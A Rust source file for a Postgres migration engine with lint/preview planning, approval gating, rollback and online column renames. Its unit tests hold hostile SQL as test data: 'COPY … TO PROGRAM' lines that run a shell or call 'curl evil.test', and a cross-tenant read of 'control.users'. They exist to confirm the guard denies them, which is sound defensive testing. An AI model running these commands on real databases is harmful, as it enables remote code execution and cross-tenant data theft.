//! The public `MigrationEngine` API — `plan` (lint/preview) → `gate` (approval)
//! → [`executor::apply`](crate::executor::apply) (guard + role) (design §3 / §1.6).
//!
//! This is the surface a caller (control plane / CLI / builder) drives. The
//! pieces beneath it — the [`SqlGuard`](crate::guard::SqlGuard), the Postgres
//! [`apply`](crate::executor::apply) flow, the least-privilege
//! [`migrator` role](crate::role) — are already built; the engine *composes*
//! them into the documented pipeline:
//!
//! 1. an **author** (see [`crate::author`]) produces the [`Migration`]s;
//! 2. [`MigrationEngine::plan`] runs the guard over every migration **read-only**
//!    (no DB) and returns a [`MigrationPlan`] — the dry-run / preview (scenario
//!    45): which migrations are destructive, which require approval, and which
//!    are *denied* (un-appliable);
//! 3. [`MigrationEngine::apply`] is the **gate**: it refuses a plan with any
//!    denial, refuses a destructive plan without explicit [`Approval::Approved`],
//!    and otherwise delegates to [`executor::apply`](crate::executor::apply).
//!
//! **Defense in depth — the gate is additional, not a replacement.**
//! [`executor::apply`](crate::executor::apply) *re-runs* the guard over every
//! pending `up` and runs the DDL under the least-privilege `migrator` role
//! (lines 1 & 2 of §1). The engine gate is a third check layered in front: even
//! if a caller hand-built a plan, the executor still independently denies the
//! dangerous surface and confines execution. The engine never disables those.

use compio_postgres::Client;

pub use crate::approval::Approval;
use crate::db::ExecutorConfig;
use crate::executor::{
    self, ApplyError, ApplyOutcome, RollbackError, RollbackOutcome, RollbackRequest,
};
use crate::guard::{GuardConfig, GuardError, GuardReport, SqlGuard};
use crate::migration::Migration;

/// One linted migration in a [`MigrationPlan`].
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PlannedMigration {
    /// The migration itself (clone of the input).
    pub migration: Migration,
    /// Its passing guard report (classes + destructive flag + lint warnings).
    pub report: GuardReport,
}

/// The read-only result of [`MigrationEngine::plan`] — the dry-run / preview
/// (design scenario 45).
///
/// A plan is **un-appliable** if [`denied`](Self::denied) is non-empty: the
/// guard hard-denied at least one migration's `up` (RCE / cross-tenant / file /
/// network), so [`MigrationEngine::apply`] refuses it outright.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct MigrationPlan {
    /// The migrations that passed the guard, with their reports, in input order.
    pub items: Vec<PlannedMigration>,
    /// `true` if any planned item is destructive (data loss) — either the guard's
    /// SQL-text classification or the migration's own `flags.destructive`.
    pub destructive: bool,
    /// `true` if applying this plan requires explicit approval. Usually tracks
    /// `destructive`, but an author may stamp `flags.requires_approval` on an op
    /// the guard reads as non-destructive (e.g. a UNIQUE-index DROP, #4) so it is
    /// gated independently of the SQL-text data-loss judgement.
    pub requires_approval: bool,
    /// Migrations the guard **denied**, as `(version, error)`. A non-empty list
    /// makes the whole plan un-appliable — `apply` returns
    /// [`EngineError::Denied`] and runs nothing.
    pub denied: Vec<(String, GuardError)>,
}

impl MigrationPlan {
    /// `true` if the plan can be applied (no denials).
    #[must_use]
    pub const fn is_appliable(&self) -> bool {
        self.denied.is_empty()
    }
}

/// A failure from [`MigrationEngine::apply`].
#[derive(Debug, thiserror::Error)]
pub enum EngineError {
    /// The plan contains guard denials and can never be applied. Carries the
    /// denied `(version, error)` pairs for reporting. Nothing was applied.
    #[error("plan is un-appliable: {} migration(s) denied by the guard", .0.len())]
    Denied(Vec<(String, GuardError)>),
    /// The plan is destructive (or otherwise requires approval) but
    /// [`Approval::Approved`] was not given. Nothing was applied.
    #[error("plan requires approval (destructive) but none was given")]
    ApprovalRequired,
    /// The executor failed (DB error, checksum drift, mid-apply failure, or the
    /// executor's own re-run of the guard denied a migration — defense in depth).
    #[error(transparent)]
    Apply(#[from] ApplyError),
}

/// A failure from [`MigrationEngine::rollback`].
#[derive(Debug, thiserror::Error)]
pub enum RollbackEngineError {
    /// Rollback is destructive (a `down` typically drops/reverses schema) and
    /// requires explicit [`Approval::Approved`], which was not given. Nothing was
    /// rolled back.
    #[error("rollback requires approval (a down is destructive) but none was given")]
    ApprovalRequired,
    /// The executor's rollback failed (guard denial on a `down`, irreversible
    /// without force, checksum drift, mid-rollback DB error, …).
    #[error(transparent)]
    Rollback(#[from] RollbackError),
}

/// The public migration engine (design §3 `MigrationEngine` seam).
#[derive(Debug, Clone, Default)]
pub struct MigrationEngine;

impl MigrationEngine {
    /// Construct the engine. (Stateless; the executor + guard config are passed
    /// per call so one engine serves every project.)
    #[must_use]
    pub const fn new() -> Self {
        Self
    }

    /// Lint + preview a migration set **read-only** (no DB) — the dry-run /
    /// plan phase (design scenario 45).
    ///
    /// Runs the [`SqlGuard`] over every migration's `up`. A guard **denial** is
    /// recorded in [`MigrationPlan::denied`] (and the migration is *not* added to
    /// `items`), so a caller sees **every** problem in the set at once rather
    /// than aborting on the first. `destructive` / `requires_approval` are `true`
    /// if any passing item's report flags data loss.
    #[must_use]
    pub fn plan(&self, migrations: &[Migration], cfg: &GuardConfig) -> MigrationPlan {
        let guard = SqlGuard::new(cfg.clone());
        let mut items = Vec::new();
        let mut denied = Vec::new();
        let mut destructive = false;
        let mut requires_approval = false;
        for m in migrations {
            match guard.check(&m.up) {
                Ok(report) => {
                    // A plan is destructive / approval-gated if EITHER the guard's
                    // SQL-text classification flags data loss OR the author stamped
                    // the migration's own flags. The author flag matters for ops
                    // the guard cannot judge from SQL text alone: a `DROP INDEX` of
                    // a UNIQUE index reads as a plain (reversible) index drop to the
                    // guard, but it silently removes a data-integrity guarantee, so
                    // the declarative author marks it `destructive + requires_approval`
                    // (#4) — and the executor's own gate already honours that flag,
                    // so the plan summary must agree (otherwise the engine would
                    // report a non-gated plan that the executor then refuses).
                    destructive |= report.destructive || m.flags.destructive;
                    requires_approval |= report.destructive || m.flags.requires_approval;
                    items.push(PlannedMigration {
                        migration: m.clone(),
                        report,
                    });
                }
                Err(e) => denied.push((m.version.as_str().to_string(), e)),
            }
        }
        MigrationPlan {
            items,
            destructive,
            requires_approval,
            denied,
        }
    }

    /// Diff a **desired** declarative schema against the **live** snapshot and
    /// lint the generated migrations into a [`MigrationPlan`] (v3 Plan A).
    ///
    /// This is the declarative entry point: it runs
    /// [`DeclarativeAuthor::diff`](crate::declarative::DeclarativeAuthor::diff)
    /// (additive ops + destructive-gated drops, with author-boundary name/type
    /// validation) and then feeds the result through the EXISTING [`plan`] —
    /// so the generated SQL gets the same guard treatment as any other author's
    /// output (no bypass). A destructive drop in the diff makes the plan
    /// `requires_approval`, exactly as a hand-authored drop would.
    ///
    /// `hints` are the OPT-IN [`RenameHint`](crate::declarative::RenameHint)s
    /// (P3): each routes a hinted drop+add pair through the zero-downtime
    /// expand-contract rename sequence instead of an independent drop + add.
    /// Without a matching hint a drop+add stays two independent ops — the differ
    /// NEVER infers a rename heuristically. An empty slice ⇒ pure P0–P2 behaviour.
    ///
    /// # A declarative rename is an online, multi-deploy op (C1)
    ///
    /// A hinted rename is NOT folded into the linted plain plan: a rename's
    /// [`ExpandContractPlan`](crate::expand_contract::ExpandContractPlan) carries a
    /// [`BackfillSpec`](crate::backfill::BackfillSpec) that must run the REAL
    /// pre-existing-row mirror (see [`run_expand`](Self::run_expand)). Flattening
    /// it through the plain `plan` → `apply` path would discard the backfill and
    /// the contract `DROP COLUMN <from>` would then destroy un-mirrored rows. So
    /// the result keeps the plain migrations and the renames SEPARATE; drive the
    /// whole thing through [`apply_declarative`](Self::apply_declarative).
    ///
    /// # Errors
    /// [`DeclarativeError`](crate::declarative::DeclarativeError) if the diff
    /// hits an unsupported op, an unmatched/type-mismatched rename hint, or an
    /// invalid descriptor name/type at the author boundary. A guard *denial* on
    /// generated SQL is NOT an error here — it lands in [`MigrationPlan::denied`]
    /// like any other.
    pub fn plan_declarative(
        &self,
        desired: &crate::declarative::DesiredSchema,
        live: &crate::drift::SchemaSnapshot,
        author: &crate::declarative::DeclarativeAuthor,
        hints: &[crate::declarative::RenameHint],
        cfg: &GuardConfig,
    ) -> Result<DeclarativeDeployPlan, crate::declarative::DeclarativeError> {
        let diff = author.diff(desired, live, hints)?;
        let plain = self.plan(&diff.migrations, cfg);
        Ok(DeclarativeDeployPlan {
            plain,
            renames: diff.renames,
        })
    }

    /// Apply a declarative deploy plan as the **online, multi-deploy** operation
    /// it is (C1 — never flatten a rename).
    ///
    /// In one call (deploy N) it:
    /// 1. applies the **plain** migrations through the existing gated
    ///    [`apply`](Self::apply) (denial / approval gate + the executor's own
    ///    guard + least-privilege role); then
    /// 2. for each rename, drives the **expand** through
    ///    [`run_expand`](Self::run_expand) — which applies E1 (ADD COLUMN) + E2
    ///    (dual-write trigger), runs the REAL [`run_backfill`] mirroring every
    ///    pre-existing `<from>` value into `<to>`, and journals E3 **only after**
    ///    the backfill succeeds (Plan-8 data-integrity ordering); and
    /// 3. collects every rename's **contract** (DROP TRIGGER C1 + DROP COLUMN
    ///    `<from>` C2) into [`DeclarativeDeployOutcome::pending_contract`] —
    ///    the DEFERRED set to apply in a SUBSEQUENT deploy, AFTER the app's code
    ///    has switched from `<from>` to `<to>`.
    ///
    /// The contract is deliberately NOT applied here: the executor's
    /// expand/contract gate refuses a contract while its own expand is still
    /// pending in the same batch, and — more importantly — dropping `<from>`
    /// before old code stops reading it breaks the rolling fleet. Surfacing the
    /// contract as `pending_contract` makes the multi-deploy partition explicit.
    ///
    /// # Deploy sequence
    /// ```text
    /// deploy N    : apply_declarative(plan)  →  plain + EXPAND (backfill runs);
    ///               returns pending_contract.  Code still uses <from>; <to> is
    ///               populated + dual-written.
    /// (code switch): a later app deploy reads/writes <to> only.
    /// deploy N+1  : engine.apply(plan_of(pending_contract), Approved, …)  →
    ///               DROP TRIGGER + DROP COLUMN <from>.  Zero data loss: every
    ///               row's value already lives in <to>.
    /// ```
    ///
    /// `approval` must be [`Approval::Approved`] when the plain plan is gated OR
    /// any rename is present (the expand's backfill mutates data). The
    /// `pending_contract` set is itself gated (`requires_approval`, and C2 is
    /// `destructive`), so applying it later also needs approval.
    ///
    /// # Errors
    /// - [`DeclarativeApplyError::Plain`] — the gated plain `apply` failed
    ///   (denial, missing approval, or an executor failure). No expand ran.
    /// - [`DeclarativeApplyError::Expand`] — a rename's expand/backfill failed.
    ///   The plain migrations + any earlier renames are already applied; the
    ///   backfill is resumable on a re-run.
    pub async fn apply_declarative(
        &self,
        plan: &DeclarativeDeployPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<DeclarativeDeployOutcome, DeclarativeApplyError> {
        // 1. The plain additive / destructive set, through the existing gate.
        let mut applied = self.apply(&plan.plain, approval, conn, exec_cfg, applied_by).await?;

        // 2. Each rename's EXPAND, through run_expand (real backfill; E3 journaled
        //    after). 3. Collect the contract as the deferred set.
        let mut pending_contract: Vec<Migration> = Vec::new();
        for rename in &plan.renames {
            let outcome = self
                .run_expand(rename, approval, conn, exec_cfg, applied_by)
                .await?;
            applied.applied.extend(outcome.applied);
            applied.skipped.extend(outcome.skipped);
            applied.recovered.extend(outcome.recovered);
            pending_contract.extend(rename.contract.iter().cloned());
        }

        Ok(DeclarativeDeployOutcome {
            applied,
            pending_contract,
        })
    }

    /// Apply a plan through the gate (design §1.6).
    ///
    /// The gate, in order:
    /// 1. if [`MigrationPlan::denied`] is non-empty ⇒ [`EngineError::Denied`]
    ///    (never apply — a denied batch applies *nothing*);
    /// 2. if [`MigrationPlan::requires_approval`] and `approval != Approved` ⇒
    ///    [`EngineError::ApprovalRequired`] (nothing applied);
    /// 3. otherwise delegate to [`executor::apply`](crate::executor::apply),
    ///    which **independently re-runs the guard** over every pending `up` and
    ///    runs the DDL under the least-privilege `migrator` role — defense in
    ///    depth, not bypassed by this gate.
    ///
    /// `applied_by` is the actor recorded in the journal (`app/actor/AI`).
    ///
    /// # Errors
    /// - [`EngineError::Denied`] — the plan had guard denials.
    /// - [`EngineError::ApprovalRequired`] — destructive plan without approval.
    /// - [`EngineError::Apply`] — the executor failed (incl. its own guard
    ///   re-check, checksum drift, or a mid-apply DB error).
    pub async fn apply(
        &self,
        plan: &MigrationPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, EngineError> {
        // Gate 1: a denied plan can never be applied.
        if !plan.denied.is_empty() {
            return Err(EngineError::Denied(plan.denied.clone()));
        }
        // Gate 2: destructive plans need explicit approval.
        if plan.requires_approval && approval != Approval::Approved {
            return Err(EngineError::ApprovalRequired);
        }
        // Gate 3: delegate to the executor, which re-runs the guard + role
        // (defense in depth). Reconstruct the migration set from the plan's
        // passing items (denied is empty here, so items == the full input set).
        let migrations: Vec<Migration> =
            plan.items.iter().map(|p| p.migration.clone()).collect();
        // Forward the approval decision: the executor re-runs its OWN destructive
        // gate (defense in depth — design §1.6), so the gate here is additional,
        // not a replacement.
        let outcome = executor::apply(conn, exec_cfg, &migrations, approval, applied_by).await?;
        Ok(outcome)
    }

    /// Roll back applied migrations to a [`RollbackTarget`] through the gate
    /// (design §5).
    ///
    /// A `down` is privileged SQL that typically **reverses** schema (drops the
    /// objects an `up` created), so rollback is treated as destructive: it
    /// **requires [`Approval::Approved`]** — the AI never auto-rolls-back. Given
    /// approval, it delegates to [`executor::rollback`](crate::executor::rollback),
    /// which **independently** runs every `down` through the guard and under the
    /// least-privilege `migrator` role (defense in depth, identical to the up
    /// path), refuses to cross an irreversible (`down: None`) migration unless
    /// `request.options.force` + `request.options.backup_acknowledged`, and
    /// journals each rollback as an append-only `rolled_back` event.
    ///
    /// `applied_by` is the actor recorded in the journal.
    ///
    /// # Errors
    /// - [`RollbackEngineError::ApprovalRequired`] — `approval != Approved`.
    /// - [`RollbackEngineError::Rollback`] — the executor's rollback failed
    ///   (guard denial on a `down`, irreversible without force, checksum drift,
    ///   missing-from-set, unknown target, or a mid-rollback DB error).
    pub async fn rollback(
        &self,
        migrations: &[Migration],
        request: RollbackRequest,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<RollbackOutcome, RollbackEngineError> {
        // Gate: rollback is destructive ⇒ explicit approval required.
        if approval != Approval::Approved {
            return Err(RollbackEngineError::ApprovalRequired);
        }
        // Forward the approval decision: the executor re-runs its OWN approval
        // gate (defense in depth — design §1.6), so the gate here is additional,
        // not a replacement.
        let outcome =
            executor::rollback(conn, exec_cfg, migrations, request, approval, applied_by).await?;
        Ok(outcome)
    }

    /// Orchestrate the EXPAND phase of an online expand-contract migration
    /// (Plan 8 v1.3): apply the additive + dual-write steps, run the backfill,
    /// then journal the backfill step's completion — in that order, so the
    /// v1.2 gate's single source of truth (the journal) only shows the expand as
    /// fully done **after the data is actually mirrored**.
    ///
    /// The sequence is deliberately NOT "apply all of `plan.expand` then
    /// backfill": E3 (the backfill-marker migration) must be journaled **after**
    /// [`run_backfill`](crate::backfill::run_backfill) succeeds, never before —
    /// otherwise the gate would let the destructive `DROP COLUMN` (which
    /// `depends_on` E3) run while pre-existing rows are still un-mirrored, losing
    /// data. So:
    ///
    /// 1. apply E1 (`ADD COLUMN`) + E2 (`CREATE FUNCTION`/`TRIGGER`) — the
    ///    dual-write trigger is now live, so every concurrent write mirrors;
    /// 2. [`run_backfill`] mirrors the pre-existing rows (`<to> := <from>` paged
    ///    on the PK), resumable, bounded — the trigger covers anything written
    ///    during it;
    /// 3. apply E3 (the no-op backfill marker) — this records the backfill's
    ///    completion in the journal, so the gate now sees the expand complete.
    ///
    /// E1+E2 and E3 each go through [`apply`](crate::executor::apply) (guard +
    /// least-privilege role + journal), and the backfill goes through its own
    /// guarded, role-bracketed batches. `approval` must be
    /// [`Approval::Approved`] (the backfill mutates data).
    ///
    /// # Errors
    /// - [`OnlineError::Approval`] — `approval != Approved`.
    /// - [`OnlineError::Apply`] — applying E1/E2 or the E3 marker failed.
    /// - [`OnlineError::Backfill`] — the backfill failed (E3 is NOT journaled, so
    ///   the gate keeps the expand incomplete and the contract stays blocked; the
    ///   backfill is resumable on a re-run).
    pub async fn run_expand(
        &self,
        plan: &crate::expand_contract::ExpandContractPlan,
        approval: Approval,
        conn: &Client,
        exec_cfg: &ExecutorConfig,
        applied_by: &str,
    ) -> Result<ApplyOutcome, OnlineError> {
        if approval != Approval::Approved {
            return Err(OnlineError::Approval);
        }
        // The expand sequence is E1, E2, E3 (the marker) in order. Split off E3:
        // it is journaled LAST, after the real backfill, never as part of the
        // structural apply.
        let Some((e3, head)) = plan.expand.split_last() else {
            return Ok(ApplyOutcome {
                applied: Vec::new(),
                skipped: Vec::new(),
                recovered: Vec::new(),
            });
        };
        // 1. Apply E1 + E2 — trigger live before any backfill row is touched.
        let mut outcome = executor::apply(conn, exec_cfg, head, approval, applied_by).await?;
        // 2. Run the real backfill (mirrors pre-existing rows).
        crate::backfill::run_backfill(conn, exec_cfg, &plan.backfill, approval, applied_by).await?;
        // 3. Journal E3 (the backfill marker) — records the backfill complete, so
        //    the gate now sees the expand fully applied and the contract may land.
        let e3_outcome =
            executor::apply(conn, exec_cfg, std::slice::from_ref(e3), approval, applied_by).await?;
        outcome.applied.extend(e3_outcome.applied);
        outcome.recovered.extend(e3_outcome.recovered);
        Ok(outcome)
    }
}

/// The structured result of [`MigrationEngine::plan_declarative`].
///
/// It holds the linted **plain** plan plus the online **renames**, kept SEPARATE
/// (C1: a rename is a multi-deploy op and must not be flattened into the plain
/// set).
#[derive(Debug, Clone)]
pub struct DeclarativeDeployPlan {
    /// The plain additive / destructive migrations, already linted by the guard
    /// (denial / destructive / approval summary), ready for the gated
    /// [`apply`](MigrationEngine::apply).
    pub plain: MigrationPlan,
    /// The online renames, each a full
    /// [`ExpandContractPlan`](crate::expand_contract::ExpandContractPlan)
    /// (expand migs + `BackfillSpec` + contract migs). Driven through
    /// [`run_expand`](MigrationEngine::run_expand), NOT the plain `apply`.
    pub renames: Vec<crate::expand_contract::ExpandContractPlan>,
}

/// The result of
/// [`MigrationEngine::apply_declarative`](MigrationEngine::apply_declarative).
#[derive(Debug, Clone)]
pub struct DeclarativeDeployOutcome {
    /// The combined apply outcome for the plain set + every rename's EXPAND
    /// (E1/E2 + the journaled E3 marker, after the real backfill).
    pub applied: ApplyOutcome,
    /// The DEFERRED contract migrations (per rename: DROP TRIGGER C1 + DROP
    /// COLUMN `<from>` C2), to be applied in a SUBSEQUENT deploy via the normal
    /// gated [`apply`](MigrationEngine::apply) AFTER app code switches to `<to>`.
    /// Empty when the deploy had no renames. These are gated
    /// (`requires_approval`; C2 is `destructive`).
    pub pending_contract: Vec<Migration>,
}

/// A failure from
/// [`MigrationEngine::apply_declarative`](MigrationEngine::apply_declarative).
#[derive(Debug, thiserror::Error)]
pub enum DeclarativeApplyError {
    /// Applying the gated plain set failed (guard denial, missing approval, or an
    /// executor failure). No rename expand ran.
    #[error(transparent)]
    Plain(#[from] EngineError),
    /// A rename's expand / backfill failed. Earlier work (the plain set + any
    /// prior rename's expand) is already applied; the backfill is resumable.
    #[error(transparent)]
    Expand(#[from] OnlineError),
}

/// A failure from [`MigrationEngine::run_expand`].
#[derive(Debug, thiserror::Error)]
pub enum OnlineError {
    /// The online expand needs explicit [`Approval::Approved`] (its backfill
    /// mutates data). Nothing was applied.
    #[error("online expand requires approval (the backfill mutates data) but none was given")]
    Approval,
    /// Applying E1/E2 or the E3 backfill marker failed.
    #[error(transparent)]
    Apply(#[from] ApplyError),
    /// The backfill step failed — E3 is NOT journaled, so the gate keeps the
    /// expand incomplete (the contract stays blocked) and the backfill is
    /// resumable on a re-run.
    #[error(transparent)]
    Backfill(#[from] crate::backfill::BackfillError),
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::author::{AuthorRequest, Column, DeterministicAuthor, MigrationAuthor, RawSqlAuthor};

    fn guard_cfg() -> GuardConfig {
        GuardConfig {
            project_schema: "proj_acme".into(),
            extension_allowlist: Vec::new(),
        }
    }

    fn det() -> DeterministicAuthor {
        DeterministicAuthor::new("proj_acme", "app_acme")
    }

    #[test]
    fn plan_of_safe_additive_set_needs_no_approval_and_has_no_denials() {
        let create = det()
            .author(&AuthorRequest::CreateTable {
                name: "orders".into(),
                columns: vec![Column {
                    name: "id".into(),
                    ty: "bigint".into(),
                    nullable: false,
                }],
            })
            .unwrap();
        let add = det()
            .author(&AuthorRequest::AddColumn {
                table: "orders".into(),
                column: Column {
                    name: "note".into(),
                    ty: "text".into(),
                    nullable: true,
                },
            })
            .unwrap();
        let set: Vec<Migration> = create.into_iter().chain(add).collect();

        let plan = MigrationEngine::new().plan(&set, &guard_cfg());
        assert_eq!(plan.items.len(), 2);
        assert!(plan.denied.is_empty());
        assert!(!plan.destructive);
        assert!(!plan.requires_approval);
        assert!(plan.is_appliable());
    }

    #[test]
    fn plan_with_a_drop_is_destructive_and_requires_approval() {
        let drop = RawSqlAuthor::new("proj_acme", "app_acme")
            .wrap("drop_legacy", "DROP TABLE \"proj_acme\".\"legacy\"", None)
            .unwrap();
        let plan = MigrationEngine::new().plan(&[drop], &guard_cfg());
        assert!(plan.denied.is_empty(), "DROP is flagged, not denied");
        assert!(plan.destructive);
        assert!(plan.requires_approval);
        // The item's own report agrees.
        assert!(plan.items[0].report.destructive);
    }

    #[test]
    fn plan_with_a_dangerous_up_records_a_denial() {
        // COPY … TO PROGRAM is shell RCE — hard-denied (not merely flagged).
        let evil = RawSqlAuthor::new("proj_acme", "app_acme")
            .wrap(
                "rce",
                "COPY \"proj_acme\".\"t\" TO PROGRAM 'curl evil.test'",
                None,
            )
            .unwrap();
        let plan = MigrationEngine::new().plan(std::slice::from_ref(&evil), &guard_cfg());
        assert_eq!(plan.items.len(), 0, "denied migration is not a planned item");
        assert_eq!(plan.denied.len(), 1);
        assert_eq!(plan.denied[0].0, evil.version.as_str());
        assert!(!plan.is_appliable());
    }

    #[test]
    fn plan_collects_every_denial_not_just_the_first() {
        let raw = RawSqlAuthor::new("proj_acme", "app_acme");
        let a = raw
            .wrap("rce", "COPY \"proj_acme\".\"t\" TO PROGRAM 'sh'", None)
            .unwrap();
        let b = raw.wrap("xtenant", "SELECT * FROM control.users", None).unwrap();
        let plan = MigrationEngine::new().plan(&[a, b], &guard_cfg());
        assert_eq!(plan.denied.len(), 2, "both denials surface");
    }

    #[test]
    fn expand_contract_rename_set_plans_with_zero_denials() {
        use crate::expand_contract::{ExpandContractAuthor, OnlineIntent};
        let plan_in = ExpandContractAuthor::new("proj_acme", "app_acme")
            .author(&OnlineIntent::RenameColumn {
                table: "users".into(),
                from: "email".into(),
                to: "email_address".into(),
                ty: "text".into(),
            })
            .expect("author");
        // The whole expand+contract set passes the guard with NO denials — the
        // dual-write fn (INVOKER plpgsql, project-qualified), the trigger, the
        // backfill marker, and the gated drops are all guard-safe.
        let set = plan_in.all();
        let plan = MigrationEngine::new().plan(&set, &guard_cfg());
        assert!(
            plan.denied.is_empty(),
            "expand-contract set must have zero denials, got {:?}",
            plan.denied
        );
        assert_eq!(plan.items.len(), set.len(), "every migration is planned");
        // The contract DROP COLUMN makes the set destructive ⇒ requires approval.
        assert!(plan.destructive);
        assert!(plan.requires_approval);
    }
}
